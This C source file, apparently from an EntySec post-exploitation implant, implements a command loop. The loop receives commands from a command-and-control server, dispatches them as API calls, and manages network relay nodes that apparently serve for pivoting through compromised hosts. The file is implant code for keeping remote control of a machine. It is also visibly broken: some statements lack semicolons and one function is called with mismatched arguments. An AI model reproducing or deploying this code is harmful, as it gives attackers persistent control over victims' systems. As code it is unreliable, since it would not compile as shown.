/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <tlv.h>
#include <c2.h>
#include <net.h>

#include <stdio.h>
#include <stdlib.h>

/*
 * Craft TLV transport packet from C2 API call packet and send
 * it to the C2 server.
 */

static void tlv_send_reply(tlv_transport_pkt_t tlv_transport_packet, c2_api_call_t *c2_api_call_new)
{
    tlv_transport_pkt_t c2_tlv_transport_packet = craft_c2_tlv_pkt(tlv_transport_packet, c2_api_call_new);

    tlv_transport_channel_send(c2_tlv_transport_packet);
    tlv_transport_pkt_free(c2_tlv_transport_packet);
}

/*
 * Run TLV console loop which reads commands repeatedly.
 */

int tlv_console_loop(tlv_transport_channel_t *tlv_transport_channel_new)
{
    c2_api_calls_t *c2_api_calls_table = NULL;
    c2_register_api_calls(&c2_api_calls_table);

    net_nodes_t *net_nodes_table = NULL;
    unsigned int net_nodes_id = 0;

    while (1)
    {
        tlv_transport_pkt_t tlv_transport_packet;
        tlv_transport_packet = tlv_transport_channel_read(tlv_transport_channel_new, TLV_NULL);

        if (tlv_transport_packet.tlv_transport_pkt_scope == API_SCOPE_PEX &&
            tlv_transport_packet.tlv_transport_pkt_tag == API_QUIT)
        {
            c2_api_call_t *c2_api_call_new = craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_SUCCESS, "");
            tlv_send_reply(tlv_transport_packet, c2_api_call_new);

            c2_api_call_free(c2_api_call_new);
            tlv_transport_pkt_free(tlv_transport_packet);

            break;
        } else if (tlv_transport_packet.tlv_transport_pkt_scope == API_SCOPE_PEX &&
                   tlv_transport_packet.tlv_transport_pkt_tag == API_ADD_NODE)
        {
            tlv_transport_pkt_t *tlv_argv;
            tlv_transport_argv_read(tlv_transport_packet.tlv_transport_pkt_channel, &tlv_argv, 4, TLV_NO_NULL);

            net_node_t net_node_new = {
                .net_node_src_host = UNPACK_INT(tlv_argv[0].tlv_transport_pkt_data),
                .net_node_src_port = UNPACK_INT(tlv_argv[1].tlv_transport_pkt_data),
                .net_node_dst_host = UNPACK_INT(tlv_argv[2].tlv_transport_pkt_data),
                .net_node_dst_port = UNPACK_INT(tlv_argv[3].tlv_transport_pkt_data),
            }

            net_nodes_add(&net_nodes_table, net_nodes_id, net_node_new);
            net_nodes_id += 1

            tlv_transport_argv_free(tlv_argv);
        } else if (tlv_transport_packet.tlv_transport_pkt_scope == API_SCOPE_PEX &&
                   tlv_transport_packet.tlv_transport_pkt_tag == API_DEL_NODE)
        {
            tlv_transport_pkt_t *tlv_argv;
            tlv_transport_argv_read(tlv_transport_packet.tlv_transport_pkt_channel, &tlv_argv, 1);

            net_nodes_delete(&net_nodes_table, UNPACK_INT(tlv_argv[0].tlv_transport_pkt_data));
            tlv_transport_argv_free(tlv_argv);
        } else
        {
            c2_api_call_t *c2_api_call_new = c2_make_api_call(&c2_api_calls_table, tlv_transport_packet);

            if (c2_api_call_new == NULL)
            {
                c2_api_call_t *c2_api_call_new = craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_NOT_IMPLEMENTED, "");
                tlv_send_reply(tlv_transport_packet, c2_api_call_new);

                c2_api_call_free(c2_api_call_new);
                tlv_transport_pkt_free(tlv_transport_packet);
            } else
            {
                tlv_transport_pkt_t c2_tlv_transport_packet = craft_c2_tlv_pkt(tlv_transport_packet, c2_api_call_new);
                tlv_transport_channel_send(c2_tlv_transport_packet);

                c2_api_call_free(c2_api_call_new);

                tlv_transport_pkt_free(c2_tlv_transport_packet);
                tlv_transport_pkt_free(tlv_transport_packet);
            }
        }
    }

    c2_api_calls_free(c2_api_calls_table);
    return 0;
}
